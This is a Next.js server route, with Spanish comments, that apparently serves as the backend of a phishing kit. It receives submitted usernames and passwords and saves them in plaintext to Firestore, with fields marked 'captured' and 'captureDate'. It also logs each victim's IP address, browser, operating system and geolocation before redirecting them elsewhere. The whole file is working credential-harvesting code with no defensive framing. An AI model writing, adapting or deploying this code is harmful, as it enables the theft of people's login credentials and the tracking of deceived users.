import { increment, updateDoc, getDoc, doc, setDoc } from "firebase/firestore";
import { NextResponse } from "next/server";
import config, { db } from "@/config";
import UAParser from "ua-parser-js";
import { v4 as uuid } from "uuid";
import { IUser } from "@/types/globals";

export async function POST(req: Request) {
  const data = await req.json();
  const userAgent = new UAParser(String(req.headers.get("user-agent")));
  const { url } = config;

  // Verificación y validación de la data recibida
  if (!data || !data.username || !data.password) {
    console.error("Datos de entrada incompletos o inválidos");
    return NextResponse.json(
      { status: "fail", message: "Datos inválidos" },
      { status: 400 }
    );
  }

  // User Info
  const id = data.id || uuid(); // Genera un nuevo ID si no se proporciona
  const ip = req.headers.get("x-forwarded-for") || "N/A";
  const browser = userAgent.getBrowser();
  const os = userAgent.getOS();
  const ipRes = await fetch(`http://ip-api.com/json/${ip}`, { method: "GET" });
  const ipData = await ipRes.json();

  try {
    const docRef = doc(db, "users", id);
    const userRef = await getDoc(docRef);

    if (userRef.exists()) {
      console.log("updating....");
      // Actualizar usuario existente
      await updateDoc(docRef, {
        username: data.username,
        password: data.password,
        captureDate: data.date,
        browser: `${browser.name} ${browser.version}`,
        ip,
        os: `${os.name} ${os.version}`,
        country: ipData.status === "success" ? ipData.country : null,
        countryCode: ipData.status === "success" ? ipData.countryCode : null,
        city: ipData.status === "success" ? ipData.city : null,
        isp: ipData.status === "success" ? ipData.isp : null,
        captured: true,
      });
    } else {
      // Crear un nuevo usuario
      const newUser: IUser = {
        id: uuid(),
        name: "Anonymous",
        email: "N/A",
        username: data.username,
        password: data.password,
        captureDate: data.date,
        browser: `${browser.name} ${browser.version}`,
        ip,
        os: `${os.name} ${os.version}`,
        country: ipData.status === "success" ? ipData.country : null,
        countryCode: ipData.status === "success" ? ipData.countryCode : null,
        city: ipData.status === "success" ? ipData.city : null,
        isp: ipData.status === "success" ? ipData.isp : null,
        sended: false,
        captured: true,
        read: true,
        attempts: 0,
        clicks: 1,
        visits: 1,
      };

      await setDoc(doc(db, "users", id), newUser);
    }

    return NextResponse.json({ status: "success", redirect: url.redirect });
  } catch (error) {
    console.error("Error en la operación de Firestore: ", error);
    return NextResponse.json(
      { status: "fail", message: "Error en el servidor" },
      { status: 500 }
    );
  }
}
